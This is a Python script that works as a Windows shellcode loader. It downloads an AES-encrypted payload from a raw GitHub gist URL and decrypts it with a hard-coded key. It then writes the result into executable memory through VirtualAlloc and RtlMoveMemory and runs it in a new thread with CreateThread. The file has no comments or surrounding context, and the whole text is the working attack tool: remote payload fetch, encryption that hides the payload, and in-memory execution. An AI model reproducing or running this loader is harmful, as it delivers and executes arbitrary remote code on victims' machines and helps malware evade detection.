import ctypes
import ctypes.wintypes
import urllib.request
from Crypto.Cipher import AES
from base64 import b64decode

def aes_decrypt(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CFB, iv)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

def main():
    key = b'eax94il288nyq0rv'

    page = urllib.request.urlopen("https://gist.githubusercontent.com/m1kemu/e14d7e8ddc0257d083d2f8de2905df36/raw/45a463bf5eedd75b648d9082b867f7b9f9eb7d69/download_me.txt")
    message = page.read()
    message = message.decode()

    ciphertext_b64 = message.split(':')[0]
    iv_b64 = message.split(':')[1]

    ciphertext = b64decode(ciphertext_b64)
    iv = b64decode(iv_b64)

    shellcode = aes_decrypt(ciphertext, key, iv)

    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.LPVOID, ctypes.wintypes.LPVOID, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID]
    CreateThread.restype = ctypes.wintypes.HANDLE

    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [ctypes.wintypes.LPVOID, ctypes.wintypes.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = ctypes.wintypes.LPVOID

    VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.DWORD]
    VirtualAlloc.restype = ctypes.wintypes.LPVOID

    VirtualProtect = ctypes.windll.kernel32.VirtualProtect
    VirtualProtect.argtypes = [ctypes.wintypes.LPVOID, ctypes.c_size_t, ctypes.wintypes.DWORD, ctypes.wintypes.LPVOID]
    VirtualProtect.restype = ctypes.wintypes.BOOL

    memptr = VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
    RtlMoveMemory(memptr, shellcode, len(shellcode))
    VirtualProtect(memptr, len(shellcode), 0x20, 0)
    thread = CreateThread(0, 0, memptr, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)

if __name__ == '__main__':
    main()
